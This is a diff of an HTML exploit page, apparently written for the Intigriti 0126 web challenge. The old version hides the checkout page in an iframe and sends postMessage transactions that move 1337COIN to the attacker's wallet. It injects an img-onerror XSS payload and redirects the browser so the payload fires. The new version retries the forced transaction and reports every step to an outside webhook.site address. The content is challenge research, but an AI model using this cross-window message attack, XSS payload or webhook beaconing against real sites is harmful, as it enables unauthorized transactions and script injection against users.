@@ -1,69 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Intigriti 0126 - Debug Iframe</title>
     <meta charset="UTF-8">
+    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}iframe{width:800px;height:600px;border:2px solid #00ff00;}</style>
 </head>
 <body>
-    <h1>EXPLOIT LOADED</h1>
-    <p>Sending transactions...</p>
+    <h1>DEBUG - Visible Iframe</h1>
+    <div id="log">Loading checkout...</div>
+    <iframe id="checkoutFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
 
     <script>
         const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
         const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
         const BASE = 'https://challenge-0126.intigriti.io';
 
-        // Track exploit start
-        fetch(`${WEBHOOK}?step=start&status=loaded`, { mode: 'no-cors' }).catch(() => {});
+        function log(msg) {
+            document.getElementById('log').innerHTML += '<br>' + msg;
+            console.log(msg);
+        }
 
-        // Create hidden iframe with checkout page
-        const f = document.createElement('iframe');
-        f.style.display = 'none';
-        f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+        function track(step, status, data = {}) {
+            fetch(`${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`, { mode: 'no-cors' }).catch(() => {});
+        }
 
-        f.onload = () => {
-            fetch(`${WEBHOOK}?step=iframe_loaded&status=ready`, { mode: 'no-cors' }).catch(() => {});
+        track('start', 'loaded', {});
 
+        const iframe = document.getElementById('checkoutFrame');
+
+        // Try multiple times to send postMessage
+        const delays = [3000, 5000, 7000, 10000, 15000];
+
+        delays.forEach((delay, index) => {
             setTimeout(() => {
-                // Transaction 1: Send 1337COIN to your wallet
-                f.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
+                log(`Attempt ${index + 1} (${delay}ms): Sending postMessage...`);
+                track(`attempt_${index+1}`, 'sending', { delay });
 
-                fetch(`${WEBHOOK}?step=tx1_sent&status=done&to=${YOUR_WALLET}`, { mode: 'no-cors' }).catch(() => {});
-                console.log('TX #1 sent to ' + YOUR_WALLET);
+                try {
+                    iframe.contentWindow.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: YOUR_WALLET,
+                            currency: '1337COIN',
+                            amount: 1
+                        }
+                    }, '*');
 
-                // Transaction 2: XSS payload - img onerror executes automatically when page loads
-                // Payload: <img src=x onerror="alert('gigawatz')">
-                // This gets rendered directly in innerHTML of marketwatch
-                const xssPayload = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}?xss_executed=1',{mode:'no-cors'})">`;
+                    track(`sent_${index+1}`, 'success', { delay });
+                    log(`  → postMessage sent at ${delay}ms`);
+                } catch (e) {
+                    track(`error_${index+1}`, 'failed', { error: e.message, delay });
+                    log(`  → Error: ${e.message}`);
+                }
+            }, delay);
+        });
 
-                f.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: xssPayload,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
+        // Listen for responses
+        window.addEventListener('message', (event) => {
+            log(`[RECEIVED] ${JSON.stringify(event.data).substring(0, 150)}`);
+            track('msg_received', 'info', {
+                data: JSON.stringify(event.data).substring(0, 200),
+                origin: event.origin
+            });
+        });
 
-                fetch(`${WEBHOOK}?step=tx2_sent&status=done&xss=${encodeURIComponent(xssPayload.substring(0,50))}`, { mode: 'no-cors' }).catch(() => {});
-                console.log('TX #2 sent with XSS');
+        // Check iframe status periodically
+        setInterval(() => {
+            try {
+                // This will fail due to cross-origin, but tells us if iframe is still there
+                const loc = iframe.contentWindow.location.href;
+                log(`Iframe URL: ${loc.substring(0, 50)}...`);
+            } catch(e) {
+                // Expected - cross-origin
+                log('Iframe is loaded (cross-origin)');
+            }
+        }, 5000);
 
-                // Redirect to marketwatch to trigger XSS
-                setTimeout(() => {
-                    fetch(`${WEBHOOK}?step=redirecting&status=to_marketwatch`, { mode: 'no-cors' }).catch(() => {});
-                    window.location = `${BASE}/marketwatch.html`;
-                }, 3000);
-            }, 5000); // Wait 5 seconds for checkout to fully load
-        };
-
-        document.body.appendChild(f);
+        // Final summary
+        setTimeout(() => {
+            log('=== SUMMARY ===');
+            log('If you see NO "msg_received" events above, checkout never responded.');
+            log('This means checkout either: redirected, no session, or event handler not attached.');
+            track('summary', 'done', {});
+        }, 20000);
     </script>
 </body>
 </html>
